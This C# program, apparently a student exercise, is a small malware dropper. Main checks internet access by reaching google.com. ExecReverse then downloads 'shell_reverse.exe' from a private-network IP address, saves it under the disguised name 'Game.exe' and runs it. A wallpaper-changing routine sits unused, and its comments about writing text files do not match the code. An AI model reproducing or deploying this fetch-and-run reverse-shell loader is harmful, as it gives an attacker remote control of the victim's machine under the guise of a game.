using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

namespace Bai_3__1_
{
    class Program
    {
        static void ChangeWallPaper()
        {
            [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            extern static bool SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, IntPtr pvParam, UInt32 fWinIni);
            var pathToSource = Marshal.StringToHGlobalUni(@"E:\Wallpaper.jpg");

            var result = SystemParametersInfo(
              0x0014, // #define SPI_SETDESKWALLPAPER        0x0014
              0,
              pathToSource,
              0x0002 | 0x0001); // SPIF_SENDCHANGE | SPIF_UPDATEINIFILE

            if (result)
            {
                // Example #2: Write one string to a text file.
                string text = "SystemParametersInfo success!\n ";
                // WriteAllText creates a file, writes the specified string to the file,
                // and then closes the file.    You do NOT need to call Flush() or Close().
                Console.WriteLine(text);
            }
            else
            {
                Int32 errCode = Marshal.GetLastWin32Error();
                // Example #2: Write one string to a text file.
                string text = "SystemParametersInfo fails! Error code is " + errCode.ToString();
                // WriteAllText creates a file, writes the specified string to the file,
                // and then closes the file.    You do NOT need to call Flush() or Close().
                Console.WriteLine(text);
            }
        }

        public static bool CheckInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        public static void ExecReverse()
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("http://192.168.111.138/shell_reverse.exe", "Game.exe");
                Process.Start(System.IO.Directory.GetCurrentDirectory() + "Game.exe");
            }
        }


        static void Main(string[] args)
        {
            //ChangeWallPaper();
            if (CheckInternetConnection()) ExecReverse();

        }
    }
}
